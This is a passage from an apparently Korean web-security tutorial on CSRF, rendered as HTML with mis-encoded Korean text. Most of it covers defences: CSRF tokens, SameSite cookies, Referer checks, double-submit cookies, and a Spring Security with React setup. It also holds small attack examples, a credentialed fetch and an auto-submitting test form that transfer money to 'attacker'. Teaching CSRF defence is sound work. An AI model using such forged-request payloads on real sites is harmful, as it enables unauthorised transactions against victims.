class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-AJAXë¥¼-ì´ìš©í•œ-ê³µê²©"><a href="#3-AJAXë¥¼-ì´ìš©í•œ-ê³µê²©" class="headerlink" title="3. AJAXë¥¼ ì´ìš©í•œ ê³µê²©"></a>3. AJAXë¥¼ ì´ìš©í•œ ê³µê²©</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://bank.com/transfer&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  <span class="comment">// ì¿ í‚¤ í¬í•¨</span></span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">to</span>: <span class="string">&#x27;attacker&#x27;</span>,</span><br><span class="line">    <span class="attr">amount</span>: <span class="number">10000</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="ğŸ›¡ï¸-CSRF-ë°©ì–´-ê¸°ë²•"><a href="#ğŸ›¡ï¸-CSRF-ë°©ì–´-ê¸°ë²•" class="headerlink" title="ğŸ›¡ï¸ CSRF ë°©ì–´ ê¸°ë²•"></a>ğŸ›¡ï¸ CSRF ë°©ì–´ ê¸°ë²•</h2><h3 id="1-CSRF-Token-ê°€ì¥-ê¸°ë³¸ì ì´ê³ -ê°•ë ¥í•œ-ë°©ë²•"><a href="#1-CSRF-Token-ê°€ì¥-ê¸°ë³¸ì ì´ê³ -ê°•ë ¥í•œ-ë°©ë²•" class="headerlink" title="1. CSRF Token (ê°€ì¥ ê¸°ë³¸ì ì´ê³  ê°•ë ¥í•œ ë°©ë²•)"></a>1. CSRF Token (ê°€ì¥ ê¸°ë³¸ì ì´ê³  ê°•ë ¥í•œ ë°©ë²•)</h3><p>ì„œë²„ê°€ ìƒì„±í•œ <strong>ëœë¤í•œ í† í°</strong>ì„ í¼ì— í¬í•¨ì‹œí‚¤ê³ , ìš”ì²­ ì‹œ ê²€ì¦í•©ë‹ˆë‹¤.</p><h4 id="ì„œë²„-ì¸¡-êµ¬í˜„-Spring-Security-ì˜ˆì‹œ"><a href="#ì„œë²„-ì¸¡-êµ¬í˜„-Spring-Security-ì˜ˆì‹œ" class="headerlink" title="ì„œë²„ ì¸¡ êµ¬í˜„ (Spring Security ì˜ˆì‹œ)"></a>ì„œë²„ ì¸¡ êµ¬í˜„ (Spring Security ì˜ˆì‹œ)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .csrf(csrf -&gt; csrf</span><br><span class="line">                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())</span><br><span class="line">            );</span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="í´ë¼ì´ì–¸íŠ¸-ì¸¡-êµ¬í˜„"><a href="#í´ë¼ì´ì–¸íŠ¸-ì¸¡-êµ¬í˜„" class="headerlink" title="í´ë¼ì´ì–¸íŠ¸ ì¸¡ êµ¬í˜„"></a>í´ë¼ì´ì–¸íŠ¸ ì¸¡ êµ¬í˜„</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML í¼ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;csrfToken&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>ì†¡ê¸ˆ<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaScript (AJAX)</span></span><br><span class="line"><span class="keyword">const</span> csrfToken = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf&quot;]&#x27;</span>).<span class="property">content</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/transfer&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-CSRF-TOKEN&#x27;</span>: csrfToken</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">to</span>: <span class="string">&#x27;recipient&#x27;</span>,</span><br><span class="line">    <span class="attr">amount</span>: <span class="number">1000</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="2-SameSite-Cookie-ì†ì„±"><a href="#2-SameSite-Cookie-ì†ì„±" class="headerlink" title="2. SameSite Cookie ì†ì„±"></a>2. SameSite Cookie ì†ì„±</h3><p>ë¸Œë¼ìš°ì €ê°€ <strong>ì™¸ë¶€ ì‚¬ì´íŠ¸ì—ì„œì˜ ìš”ì²­ì—ëŠ” ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ì§€ ì•Šë„ë¡</strong> ì„¤ì •í•©ë‹ˆë‹¤.</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123; SameSite=Strict; HttpOnly; Secure</span><br></pre></td></tr></table></figure><h4 id="SameSite-ì˜µì…˜"><a href="#SameSite-ì˜µì…˜" class="headerlink" title="SameSite ì˜µì…˜"></a>SameSite ì˜µì…˜</h4><table><thead><tr><th>ê°’</th><th>ì„¤ëª…</th></tr></thead><tbody><tr><td><code>Strict</code></td><td>ì™¸ë¶€ ì‚¬ì´íŠ¸ì—ì„œ ì˜¨ ìš”ì²­ì—ëŠ” ì ˆëŒ€ ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ì§€ ì•ŠìŒ</td></tr><tr><td><code>Lax</code></td><td>GET ìš”ì²­ ë“± ì¼ë¶€ ì•ˆì „í•œ ìš”ì²­ì—ë§Œ ì¿ í‚¤ ì „ì†¡ (ê¸°ë³¸ê°’)</td></tr><tr><td><code>None</code></td><td>ëª¨ë“  ìš”ì²­ì— ì¿ í‚¤ ì „ì†¡ (HTTPS + Secure ì†ì„± í•„ìˆ˜)</td></tr></tbody></table><h4 id="Spring-Boot-ì„¤ì •"><a href="#Spring-Boot-ì„¤ì •" class="headerlink" title="Spring Boot ì„¤ì •"></a>Spring Boot ì„¤ì •</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">session:</span></span><br><span class="line">      <span class="attr">cookie:</span></span><br><span class="line">        <span class="attr">same-site:</span> <span class="string">strict</span></span><br><span class="line">        <span class="attr">http-only:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">secure:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java ì½”ë“œë¡œ ì„¤ì •</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> CookieSameSiteSupplier <span class="title function_">cookieSameSiteSupplier</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> CookieSameSiteSupplier.ofStrict();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Referer-Origin-í—¤ë”-ê²€ì¦"><a href="#3-Referer-Origin-í—¤ë”-ê²€ì¦" class="headerlink" title="3. Referer&#x2F;Origin í—¤ë” ê²€ì¦"></a>3. Referer&#x2F;Origin í—¤ë” ê²€ì¦</h3><p>ìš”ì²­ì´ <strong>ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë„ë©”ì¸ì—ì„œ ì™”ëŠ”ì§€</strong> í™•ì¸í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfRefererFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                    HttpServletResponse response,</span></span><br><span class="line"><span class="params">                                    FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Referer&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Origin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;POST&quot;</span>.equals(request.getMethod())) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (referer == <span class="literal">null</span> || !referer.startsWith(<span class="string">&quot;https://bank.com&quot;</span>)) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN,</span><br><span class="line">                               <span class="string">&quot;Invalid referer&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Double-Submit-Cookie-íŒ¨í„´"><a href="#4-Double-Submit-Cookie-íŒ¨í„´" class="headerlink" title="4. Double Submit Cookie íŒ¨í„´"></a>4. Double Submit Cookie íŒ¨í„´</h3><p>CSRF í† í°ì„ <strong>ì¿ í‚¤ì™€ ìš”ì²­ íŒŒë¼ë¯¸í„° ì–‘ìª½ì—</strong> í¬í•¨ì‹œí‚¤ê³ , ì„œë²„ì—ì„œ ë‘ ê°’ì´ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì¿ í‚¤ì—ì„œ í† í° ì½ê¸°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> value = <span class="string">`; <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> parts = value.<span class="title function_">split</span>(<span class="string">`; <span class="subst">$&#123;name&#125;</span>=`</span>);</span><br><span class="line">  <span class="keyword">if</span> (parts.<span class="property">length</span> === <span class="number">2</span>) <span class="keyword">return</span> parts.<span class="title function_">pop</span>().<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>).<span class="title function_">shift</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìš”ì²­ ì‹œ í—¤ë”ì— í† í° í¬í•¨</span></span><br><span class="line"><span class="keyword">const</span> csrfToken = <span class="title function_">getCookie</span>(<span class="string">&#x27;XSRF-TOKEN&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/transfer&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;X-XSRF-TOKEN&#x27;</span>: csrfToken,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="5-Custom-Header-ì‚¬ìš©"><a href="#5-Custom-Header-ì‚¬ìš©" class="headerlink" title="5. Custom Header ì‚¬ìš©"></a>5. Custom Header ì‚¬ìš©</h3><p>AJAX ìš”ì²­ì— <strong>ì»¤ìŠ¤í…€ í—¤ë”</strong>ë¥¼ ì¶”ê°€í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤.<br>Same-Origin Policyì— ì˜í•´ ì™¸ë¶€ ì‚¬ì´íŠ¸ëŠ” ì»¤ìŠ¤í…€ í—¤ë”ë¥¼ ì¶”ê°€í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/transfer&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì„œë²„ ì¸¡ ê²€ì¦</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="string">&quot;XMLHttpRequest&quot;</span>.equals(request.getHeader(<span class="string">&quot;X-Requested-With&quot;</span>))) &#123;</span><br><span class="line">    response.sendError(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ğŸ”-ì‹¤ì „-ë°©ì–´-ì „ëµ"><a href="#ğŸ”-ì‹¤ì „-ë°©ì–´-ì „ëµ" class="headerlink" title="ğŸ” ì‹¤ì „ ë°©ì–´ ì „ëµ"></a>ğŸ” ì‹¤ì „ ë°©ì–´ ì „ëµ</h2><h3 id="ê¶Œì¥-ì¡°í•©"><a href="#ê¶Œì¥-ì¡°í•©" class="headerlink" title="ê¶Œì¥ ì¡°í•©"></a>ê¶Œì¥ ì¡°í•©</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ìµœê³  ìˆ˜ì¤€ì˜ ë³´í˜¸</span></span><br><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">CSRF</span> <span class="string">Token</span> <span class="string">(Stateful)</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">SameSite=Strict</span> <span class="string">Cookie</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">Referer/Origin</span> <span class="string">í—¤ë”</span> <span class="string">ê²€ì¦</span></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">HTTPS</span> <span class="string">ê°•ì œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># API ì„œë²„ìš© (Stateless)</span></span><br><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">Double</span> <span class="string">Submit</span> <span class="string">Cookie</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">SameSite=Lax</span> <span class="string">Cookie</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">Custom</span> <span class="string">Header</span> <span class="string">ê²€ì¦</span></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">CORS</span> <span class="string">ì •ì±…</span> <span class="string">ì—„ê²©íˆ</span> <span class="string">ì„¤ì •</span></span><br></pre></td></tr></table></figure><h3 id="Spring-Security-React-ì˜ˆì‹œ"><a href="#Spring-Security-React-ì˜ˆì‹œ" class="headerlink" title="Spring Security + React ì˜ˆì‹œ"></a>Spring Security + React ì˜ˆì‹œ</h3><h4 id="Backend-Spring-Boot"><a href="#Backend-Spring-Boot" class="headerlink" title="Backend (Spring Boot)"></a>Backend (Spring Boot)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .csrf(csrf -&gt; csrf</span><br><span class="line">                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())</span><br><span class="line">                .csrfTokenRequestHandler(<span class="keyword">new</span> <span class="title class_">SpaCsrfTokenRequestHandler</span>())</span><br><span class="line">            )</span><br><span class="line">            .cors(cors -&gt; cors.configurationSource(corsConfigurationSource()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsConfigurationSource <span class="title function_">corsConfigurationSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        config.setAllowedOrigins(List.of(<span class="string">&quot;https://frontend.com&quot;</span>));</span><br><span class="line">        config.setAllowedMethods(List.of(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>));</span><br><span class="line">        config.setAllowCredentials(<span class="literal">true</span>);</span><br><span class="line">        config.setAllowedHeaders(List.of(<span class="string">&quot;*&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        source.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>, config);</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSRF í† í° ì—”ë“œí¬ì¸íŠ¸</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/api/csrf-token&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CsrfToken <span class="title function_">getCsrfToken</span><span class="params">(CsrfToken token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Frontend-React"><a href="#Frontend-React" class="headerlink" title="Frontend (React)"></a>Frontend (React)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// API í´ë¼ì´ì–¸íŠ¸ ì„¤ì •</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;https://api.bank.com&#x27;</span>,</span><br><span class="line">  <span class="attr">withCredentials</span>: <span class="literal">true</span>  <span class="comment">// ì¿ í‚¤ í¬í•¨</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSRF í† í° ê°€ì ¸ì˜¤ê¸°</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getCsrfToken</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> api.<span class="title function_">get</span>(<span class="string">&#x27;/api/csrf-token&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="property">data</span>.<span class="property">token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìš”ì²­ ì¸í„°ì…‰í„°ì— CSRF í† í° ì¶”ê°€</span></span><br><span class="line">api.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="keyword">async</span> (config) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> ([<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>].<span class="title function_">includes</span>(config.<span class="property">method</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="keyword">await</span> <span class="title function_">getCsrfToken</span>();</span><br><span class="line">    config.<span class="property">headers</span>[<span class="string">&#x27;X-CSRF-TOKEN&#x27;</span>] = token;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> config;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš© ì˜ˆì‹œ</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">to, amount</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> api.<span class="title function_">post</span>(<span class="string">&#x27;/api/transfer&#x27;</span>, &#123; to, amount &#125;);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="âš ï¸-ì£¼ì˜ì‚¬í•­"><a href="#âš ï¸-ì£¼ì˜ì‚¬í•­" class="headerlink" title="âš ï¸ ì£¼ì˜ì‚¬í•­"></a>âš ï¸ ì£¼ì˜ì‚¬í•­</h2><h3 id="CSRF-ë°©ì–´ê°€-í•„ìš”-ì—†ëŠ”-ê²½ìš°"><a href="#CSRF-ë°©ì–´ê°€-í•„ìš”-ì—†ëŠ”-ê²½ìš°" class="headerlink" title="CSRF ë°©ì–´ê°€ í•„ìš” ì—†ëŠ” ê²½ìš°"></a>CSRF ë°©ì–´ê°€ í•„ìš” ì—†ëŠ” ê²½ìš°</h3><ol><li><p><strong>ìˆœìˆ˜ ì½ê¸° ì „ìš© API (GET)</strong></p><ul><li>ë‹¨, GET ìš”ì²­ìœ¼ë¡œ ìƒíƒœë¥¼ ë³€ê²½í•˜ë©´ ì•ˆ ë¨!</li></ul></li><li><p><strong>ìƒíƒœë¥¼ ë³€ê²½í•˜ì§€ ì•ŠëŠ” ìš”ì²­</strong></p><ul><li>ì¡°íšŒ, ê²€ìƒ‰ ë“±</li></ul></li></ol><h3 id="GET-ìš”ì²­ì˜-ìœ„í—˜ì„±"><a href="#GET-ìš”ì²­ì˜-ìœ„í—˜ì„±" class="headerlink" title="GET ìš”ì²­ì˜ ìœ„í—˜ì„±"></a>GET ìš”ì²­ì˜ ìœ„í—˜ì„±</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âŒ ì˜ëª»ëœ ì˜ˆì‹œ - GETìœ¼ë¡œ ìƒíƒœ ë³€ê²½</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/delete-account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteAccount</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ê³„ì • ì‚­ì œ ë¡œì§</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ì˜¬ë°”ë¥¸ ì˜ˆì‹œ</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/delete-account&quot;)</span></span><br><span class="line"><span class="meta">@CsrfProtected</span>  <span class="comment">// CSRF ë³´í˜¸ í•„ìš”</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteAccount</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ê³„ì • ì‚­ì œ ë¡œì§</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="API-ì¸ì¦-ë°©ì‹ë³„-CSRF-ì·¨ì•½ì "><a href="#API-ì¸ì¦-ë°©ì‹ë³„-CSRF-ì·¨ì•½ì " class="headerlink" title="API ì¸ì¦ ë°©ì‹ë³„ CSRF ì·¨ì•½ì "></a>API ì¸ì¦ ë°©ì‹ë³„ CSRF ì·¨ì•½ì </h3><table><thead><tr><th>ì¸ì¦ ë°©ì‹</th><th>CSRF ì·¨ì•½ì </th><th>ì´ìœ </th></tr></thead><tbody><tr><td>Session Cookie</td><td>âœ… ì·¨ì•½</td><td>ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ ì¿ í‚¤ ì „ì†¡</td></tr><tr><td>JWT (Cookie)</td><td>âœ… ì·¨ì•½</td><td>ì¿ í‚¤ ì €ì¥ ì‹œ ìë™ ì „ì†¡</td></tr><tr><td>JWT (LocalStorage)</td><td>âŒ ì•ˆì „</td><td>JavaScriptë¡œë§Œ ì ‘ê·¼ ê°€ëŠ¥ (XSS ì£¼ì˜)</td></tr><tr><td>Bearer Token</td><td>âŒ ì•ˆì „</td><td>Authorization í—¤ë”ëŠ” ìë™ ì „ì†¡ ì•ˆ ë¨</td></tr></tbody></table><h2 id="ğŸ§ª-CSRF-ê³µê²©-í…ŒìŠ¤íŠ¸"><a href="#ğŸ§ª-CSRF-ê³µê²©-í…ŒìŠ¤íŠ¸" class="headerlink" title="ğŸ§ª CSRF ê³µê²© í…ŒìŠ¤íŠ¸"></a>ğŸ§ª CSRF ê³µê²© í…ŒìŠ¤íŠ¸</h2><h3 id="ì·¨ì•½ì -í™•ì¸-ë°©ë²•"><a href="#ì·¨ì•½ì -í™•ì¸-ë°©ë²•" class="headerlink" title="ì·¨ì•½ì  í™•ì¸ ë°©ë²•"></a>ì·¨ì•½ì  í™•ì¸ ë°©ë²•</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- test.html - ê³µê²© ì‹œë®¬ë ˆì´ì…˜ í˜ì´ì§€ --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSRF Attack Simulation<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/api/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;attackForm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span 